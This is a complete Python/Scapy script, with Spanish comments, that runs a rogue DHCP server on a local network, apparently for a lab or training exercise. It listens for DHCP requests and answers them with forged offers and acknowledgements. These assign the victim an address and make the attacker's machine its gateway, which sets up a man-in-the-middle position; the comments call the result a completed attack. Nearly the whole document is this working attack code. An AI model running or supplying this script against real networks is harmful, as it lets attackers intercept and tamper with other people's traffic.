from scapy.all import *

# Configuración
ATTACKER_IP = "10.12.50.100"
VICTIM_IP = "10.12.50.150"
INTERFACE = "eth0"
ATTACKER_MAC = get_if_hwaddr(INTERFACE)

def rogue_dhcp(pkt):
    if DHCP in pkt:
        msg_type = pkt[DHCP].options[0][1]
        
        # 1. Si es DISCOVER (tipo 1) -> Enviamos OFFER
        if msg_type == 1:
            print(f"[*] Discover de {pkt[Ether].src}. Enviando OFFER...")
            offer = Ether(src=ATTACKER_MAC, dst=pkt[Ether].src) / \
                    IP(src=ATTACKER_IP, dst="255.255.255.255") / \
                    UDP(sport=67, dport=68) / \
                    BOOTP(op=2, yiaddr=VICTIM_IP, siaddr=ATTACKER_IP, chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) / \
                    DHCP(options=[("message-type", "offer"),
                                  ("server_id", ATTACKER_IP),
                                  ("subnet_mask", "255.255.255.0"),
                                  ("router", ATTACKER_IP), # Tú eres el Gateway
                                  ("name_server", "8.8.8.8"),
                                  ("lease_time", 3600),
                                  "end"])
            sendp(offer, iface=INTERFACE, verbose=0)

        # 2. Si es REQUEST (tipo 3) -> Enviamos ACK (Confirmación final)
        elif msg_type == 3:
            print(f"[*] Request de {pkt[Ether].src}. Enviando ACK... ¡Ataque completado!")
            ack = Ether(src=ATTACKER_MAC, dst=pkt[Ether].src) / \
                  IP(src=ATTACKER_IP, dst="255.255.255.255") / \
                  UDP(sport=67, dport=68) / \
                  BOOTP(op=2, yiaddr=VICTIM_IP, siaddr=ATTACKER_IP, chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) / \
                  DHCP(options=[("message-type", "ack"),
                                ("server_id", ATTACKER_IP),
                                ("subnet_mask", "255.255.255.0"),
                                ("router", ATTACKER_IP),
                                ("name_server", "8.8.8.8"),
                                ("lease_time", 3600),
                                "end"])
            sendp(ack, iface=INTERFACE, verbose=0)

print(f"--- Rogue DHCP Server Iniciado en {INTERFACE} ---")
sniff(filter="udp and (port 67 or 68)", prn=rogue_dhcp, iface=INTERFACE)
